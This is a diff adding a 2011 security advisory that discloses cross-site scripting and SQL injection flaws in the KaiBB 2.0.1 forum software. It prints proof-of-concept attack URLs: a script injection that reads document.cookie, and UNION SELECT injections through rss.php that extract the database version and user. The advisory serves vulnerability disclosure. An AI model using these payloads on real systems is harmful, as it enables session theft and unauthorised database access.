@@ -1,0 +1,55 @@
+Advisory:              		KaiBB 2.0.1 XSS and SQL Injection vulnerabilities
+Advisory ID:           	SSCHADV2011-027
+Author:                		Stefan Schurtz
+Affected Software:  	Successfully tested on KaiBB 2.0.1
+Vendor URL:          	http://code.google.com/p/kaibb/
+Vendor Status:       	informed
+CVE-ID:                	 	-
+
+==========================
+Vulnerability Description:
+==========================
+
+KaiBB 2.0.1 is prone to XSS and SQL Injection vulnerabilities
+
+==================
+Technical Details:
+==================
+
+Cross-site Scripting
+
+http://<target>/kaibb/?'</script><script>alert(document.cookie)</script>
+http://<target>/kaibb/index.php?'</script><script>alert(document.cookie)</script>
+
+SQL Injection
+
+http://<target>/kaibb/rss.php?forum=' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL AND 'a'='a
+http://<target>/kaibb/rss.php?forum=' UNION ALL SELECT NULL, version(), NULL, NULL, NULL, NULL, NULL AND 'a'='a
+http://<target>/kaibb/rss.php?forum=' UNION ALL SELECT NULL, user(), NULL, NULL, NULL, NULL, NULL AND 'a'='a
+
+=========
+Solution:
+=========
+
+-
+
+====================
+Disclosure Timeline:
+====================
+
+08-Oct-2011 - informed developers
+08-Oct-2011 - release date of this security advisory
+
+========
+Credits:
+========
+
+Vulnerability found and advisory written by Stefan Schurtz.
+
+===========
+References:
+===========
+
+http://code.google.com/p/kaibb/
+http://code.google.com/p/kaibb/issues/detail?id=2
+http://www.rul3z.de/advisories/SSCHADV2011-027.txt
